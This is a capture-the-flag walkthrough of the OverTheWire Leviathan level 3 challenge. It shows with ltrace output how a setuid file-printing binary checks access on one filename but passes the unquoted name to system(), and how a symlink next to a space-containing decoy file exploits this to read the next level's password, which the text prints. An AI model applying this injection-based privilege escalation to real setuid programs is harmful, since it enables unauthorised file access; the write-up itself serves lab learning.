# Level 3

```
leviathan2@leviathan:~$ ls
printfile
leviathan2@leviathan:~$ ./printfile 
*** File Printer ***
Usage: ./printfile filename
leviathan2@leviathan:~$ file printfile 
printfile: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=46891a094764828605a00c0c38abfccbe4b46548, not stripped
```

I went for the obvious solution but it doesn't seem to work. It doesn't seem like the filepath is hardcoded either

```
leviathan2@leviathan:~$ ./printfile /etc/leviathan_pass/leviathan3
You cant have that file...
leviathan2@leviathan:~$ ./printfile /etc/leviathan_pass/./leviathan3
You cant have that file...
leviathan2@leviathan:~$ ./printfile /etc/leviathan_pass/./../leviathan_pass/leviathan3
You cant have that file...
```

Using `ltrace` shows promising results though. It seems like the filename isn't surrounded in quotes before it's passed to `cat`...

```
leviathan2@leviathan:/tmp/opopop$ echo asdf content > asdf
leviathan2@leviathan:/tmp/opopop$ ltrace ~/printfile asdf
__libc_start_main(0x804852b, 2, 0xffffd654, 0x8048610 <unfinished ...>
access("asdf", 4)                                                                                       = 0
snprintf("/bin/cat asdf", 511, "/bin/cat %s", "asdf")                                                   = 13
geteuid()                                                                                               = 12002
geteuid()                                                                                               = 12002
setreuid(12002, 12002)                                                                                  = 0
system("/bin/cat asdf"asdf content
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                  = 0
+++ exited (status 0) +++
```

This means that the `access` function may not necessarily verify the permissions for the same file it will be printing. Here's an example of what I mean

```
leviathan2@leviathan:/tmp/opopop$ echo This will not be printed > asdf\ ghjk
leviathan2@leviathan:/tmp/opopop$ ltrace ~/printfile asdf\ ghjk 
__libc_start_main(0x804852b, 2, 0xffffd654, 0x8048610 <unfinished ...>
access("asdf ghjk", 4)                                                                                  = 0
snprintf("/bin/cat asdf ghjk", 511, "/bin/cat %s", "asdf ghjk")                                         = 18
geteuid()                                                                                               = 12002
geteuid()                                                                                               = 12002
setreuid(12002, 12002)                                                                                  = 0
system("/bin/cat asdf ghjk"asdf content
/bin/cat: ghjk: No such file or directory
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                  = 256
+++ exited (status 0) +++
```

Here `access` checks for the perms in the file `asdf ghjk` but a different file is printed. Let's use that with the password file

```
leviathan2@leviathan:/tmp/opopop$ ls -la
total 228
drwxr-sr-x   2 leviathan2 root   4096 Feb  7 18:26 .
drwxrws-wt 297 root       root 225280 Feb  7 18:26 ..
lrwxrwxrwx   1 leviathan2 root     30 Feb  7 17:01 symlink -> /etc/leviathan_pass/leviathan3
-rw-r--r--   1 leviathan2 root      0 Feb  7 18:15 symlink but fake
leviathan2@leviathan:/tmp/opopop$ ~/printfile symlink\ but\ fake 
Ahdiemoo1j
/bin/cat: but: No such file or directory
/bin/cat: fake: No such file or directory
```

And that did it! I needed to create a symlink because I'm not allowed to write files to `/etc/leviathan_pass`, but it seems to have worked perfectly.
